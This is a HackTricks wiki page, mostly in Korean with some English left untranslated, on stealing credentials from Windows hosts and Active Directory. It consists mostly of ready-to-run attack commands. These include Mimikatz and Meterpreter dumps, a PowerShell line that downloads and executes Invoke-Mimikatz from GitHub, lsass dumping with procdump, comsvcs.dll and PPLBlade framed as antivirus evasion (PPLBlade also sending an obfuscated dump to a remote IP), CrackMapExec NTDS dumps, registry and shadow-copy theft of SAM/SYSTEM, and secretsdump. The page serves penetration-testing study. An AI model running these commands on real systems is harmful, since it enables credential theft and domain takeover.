# Windows 자격 증명 탈취

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}

## 자격 증명 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz가 할 수 있는 다른 것들을** [**이 페이지에서**](credentials-mimikatz.md)** 찾아보세요.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**여기에서 일부 가능한 자격 증명 보호에 대해 알아보세요.**](credentials-protections.md) **이 보호 기능은 Mimikatz가 일부 자격 증명을 추출하는 것을 방지할 수 있습니다.**

## Meterpreter를 통한 자격 증명

내가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용하여 **희생자의 내부에서 비밀번호와 해시를 검색하세요.**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV 우회

### Procdump + Mimikatz

**SysInternals의 Procdump는** [**합법적인 Microsoft 도구**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **이므로** Defender에 의해 탐지되지 않습니다.\
이 도구를 사용하여 **lsass 프로세스를 덤프하고**, **덤프를 다운로드**하며 **덤프에서 자격 증명을 로컬로 추출**할 수 있습니다.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="덤프에서 자격 증명 추출" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

이 과정은 [SprayKatz](https://github.com/aas-n/spraykatz)로 자동으로 수행됩니다: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**참고**: 일부 **AV**는 **procdump.exe를 사용하여 lsass.exe를 덤프하는 것**을 **악성**으로 **탐지**할 수 있습니다. 이는 **"procdump.exe"와 "lsass.exe"** 문자열을 **탐지**하기 때문입니다. 따라서 **lsass.exe의 PID**를 procdump에 **인수로 전달하는 것이** **더 은밀합니다.**

### **comsvcs.dll**로 lsass 덤프하기

`C:\Windows\System32`에 있는 **comsvcs.dll**이라는 DLL은 충돌 시 **프로세스 메모리 덤프**를 담당합니다. 이 DLL에는 `rundll32.exe`를 사용하여 호출되도록 설계된 **`MiniDumpW`**라는 **함수**가 포함되어 있습니다.\
첫 번째 두 인수를 사용하는 것은 무관하지만, 세 번째 인수는 세 가지 구성 요소로 나뉩니다. 덤프할 프로세스 ID가 첫 번째 구성 요소를 구성하고, 덤프 파일 위치가 두 번째를 나타내며, 세 번째 구성 요소는 엄격히 **full**이라는 단어입니다. 대체 옵션은 존재하지 않습니다.\
이 세 가지 구성 요소를 파싱하면 DLL이 덤프 파일을 생성하고 지정된 프로세스의 메모리를 이 파일로 전송하는 작업을 수행합니다.\
**comsvcs.dll**을 사용하여 lsass 프로세스를 덤프할 수 있으므로 procdump를 업로드하고 실행할 필요가 없습니다. 이 방법에 대한 자세한 내용은 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)에서 설명되어 있습니다.

다음 명령이 실행에 사용됩니다:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**이 프로세스를** [**lssasy**](https://github.com/Hackndo/lsassy)**로 자동화할 수 있습니다.**

### **작업 관리자를 사용하여 lsass 덤프하기**

1. 작업 표시줄을 마우스 오른쪽 버튼으로 클릭하고 작업 관리자를 클릭합니다.
2. 자세히 보기 클릭
3. 프로세스 탭에서 "로컬 보안 권한 프로세스"를 검색합니다.
4. "로컬 보안 권한 프로세스"를 마우스 오른쪽 버튼으로 클릭하고 "덤프 파일 만들기"를 클릭합니다.

### procdump를 사용하여 lsass 덤프하기

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)는 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 스위트의 일부인 Microsoft 서명 이진 파일입니다.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)는 메모리 덤프를 난독화하고 원격 워크스테이션으로 전송할 수 있는 보호 프로세스 덤퍼 도구입니다. 디스크에 저장하지 않고도 가능합니다.

**주요 기능**:

1. PPL 보호 우회
2. Defender 서명 기반 탐지 메커니즘을 피하기 위해 메모리 덤프 파일 난독화
3. 디스크에 저장하지 않고 RAW 및 SMB 업로드 방법으로 메모리 덤프 업로드 (파일리스 덤프)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### SAM 해시 덤프
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA 비밀 덤프
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 대상 DC에서 NTDS.dit 덤프하기
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 대상 DC에서 NTDS.dit 비밀번호 기록 덤프하기
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### NTDS.dit 계정마다 pwdLastSet 속성 표시
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM 및 SYSTEM 훔치기

이 파일은 **_C:\windows\system32\config\SAM_** 및 **_C:\windows\system32\config\SYSTEM._**에 **위치해야** 합니다. 그러나 **일반적인 방법으로 복사할 수는 없습니다**. 왜냐하면 이들은 보호되어 있기 때문입니다.

### 레지스트리에서

이 파일을 훔치는 가장 쉬운 방법은 레지스트리에서 복사하는 것입니다:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**다운로드** 해당 파일을 Kali 머신에 **해시를 추출**하려면:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### 볼륨 섀도 복사

이 서비스를 사용하여 보호된 파일을 복사할 수 있습니다. 관리자 권한이 필요합니다.

#### vssadmin 사용하기

vssadmin 바이너리는 Windows Server 버전에서만 사용할 수 있습니다.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
하지만 **Powershell**을 사용하여 동일한 작업을 수행할 수 있습니다. 다음은 **SAM 파일을 복사하는 방법**의 예입니다(사용된 하드 드라이브는 "C:"이며 C:\users\Public에 저장됩니다). 그러나 이를 사용하여 보호된 파일을 복사할 수 있습니다:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

마지막으로, [**PS 스크립트 Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)를 사용하여 SAM, SYSTEM 및 ntds.dit의 복사본을 만들 수 있습니다.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** 파일은 **Active Directory**의 핵심으로, 사용자 객체, 그룹 및 그들의 멤버십에 대한 중요한 데이터를 보유하고 있습니다. 도메인 사용자의 **비밀번호 해시**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 위치합니다.

이 데이터베이스 내에는 세 가지 주요 테이블이 유지됩니다:

- **Data Table**: 이 테이블은 사용자 및 그룹과 같은 객체에 대한 세부 정보를 저장하는 역할을 합니다.
- **Link Table**: 그룹 멤버십과 같은 관계를 추적합니다.
- **SD Table**: 각 객체에 대한 **보안 설명자**가 여기에 저장되어, 저장된 객체에 대한 보안 및 접근 제어를 보장합니다.

자세한 정보는 다음을 참조하세요: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows는 _Ntdsa.dll_을 사용하여 해당 파일과 상호작용하며, _lsass.exe_에 의해 사용됩니다. 그런 다음, **NTDS.dit** 파일의 일부는 **`lsass`** 메모리 내에 위치할 수 있습니다 (성능 향상을 위해 **캐시**를 사용하여 최근에 접근한 데이터를 찾을 수 있습니다).

#### NTDS.dit 내 해시 복호화

해시는 3번 암호화됩니다:

1. **BOOTKEY**와 **RC4**를 사용하여 비밀번호 암호화 키(**PEK**)를 복호화합니다.
2. **PEK**와 **RC4**를 사용하여 **해시**를 복호화합니다.
3. **DES**를 사용하여 **해시**를 복호화합니다.

**PEK**는 **모든 도메인 컨트롤러**에서 **같은 값**을 가지지만, **도메인 컨트롤러의 SYSTEM 파일의 BOOTKEY**를 사용하여 **NTDS.dit** 파일 내에서 **암호화**됩니다 (도메인 컨트롤러 간에 다릅니다). 따라서 NTDS.dit 파일에서 자격 증명을 얻으려면 **NTDS.dit 및 SYSTEM 파일**이 필요합니다 (_C:\Windows\System32\config\SYSTEM_).

### Ntdsutil을 사용하여 NTDS.dit 복사하기

Windows Server 2008부터 사용 가능합니다.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
You could also use the [**volume shadow copy**](./#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).

### **NTDS.dit에서 해시 추출하기**

Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
You can also **extract them automatically** using a valid domain admin user:  
당신은 또한 **유효한 도메인 관리자 사용자**를 사용하여 자동으로 추출할 수 있습니다:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
For **big NTDS.dit files**는 [gosecretsdump](https://github.com/c-sto/gosecretsdump)를 사용하여 추출하는 것이 권장됩니다.

마지막으로, **metasploit 모듈**: _post/windows/gather/credentials/domain\_hashdump_ 또는 **mimikatz** `lsadump::lsa /inject`를 사용할 수도 있습니다.

### **NTDS.dit에서 SQLite 데이터베이스로 도메인 객체 추출하기**

NTDS 객체는 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)를 사용하여 SQLite 데이터베이스로 추출할 수 있습니다. 비밀뿐만 아니라 전체 객체와 그 속성도 추출되어 원시 NTDS.dit 파일이 이미 검색된 경우 추가 정보 추출을 위해 사용됩니다.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` 하이브는 선택 사항이지만 비밀 복호화를 허용합니다 (NT 및 LM 해시, 일반 텍스트 비밀번호, kerberos 또는 신뢰 키와 같은 보조 자격 증명, NT 및 LM 비밀번호 기록). 다른 정보와 함께 다음 데이터가 추출됩니다: 해시가 있는 사용자 및 머신 계정, UAC 플래그, 마지막 로그온 및 비밀번호 변경의 타임스탬프, 계정 설명, 이름, UPN, SPN, 그룹 및 재귀적 멤버십, 조직 단위 트리 및 멤버십, 신뢰 유형, 방향 및 속성이 있는 신뢰된 도메인...

## Lazagne

[여기](https://github.com/AlessandroZ/LaZagne/releases)에서 바이너리를 다운로드하세요. 이 바이너리를 사용하여 여러 소프트웨어에서 자격 증명을 추출할 수 있습니다.
```
lazagne.exe all
```
## Other tools for extracting credentials from SAM and LSASS

### Windows credentials Editor (WCE)

이 도구는 메모리에서 자격 증명을 추출하는 데 사용할 수 있습니다. 다음에서 다운로드하세요: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM 파일에서 자격 증명을 추출합니다.
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM 파일에서 자격 증명 추출
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

다음에서 다운로드하세요: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) 그리고 **실행하면** 비밀번호가 추출됩니다.

## Defenses

[**여기에서 일부 자격 증명 보호에 대해 알아보세요.**](credentials-protections.md)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
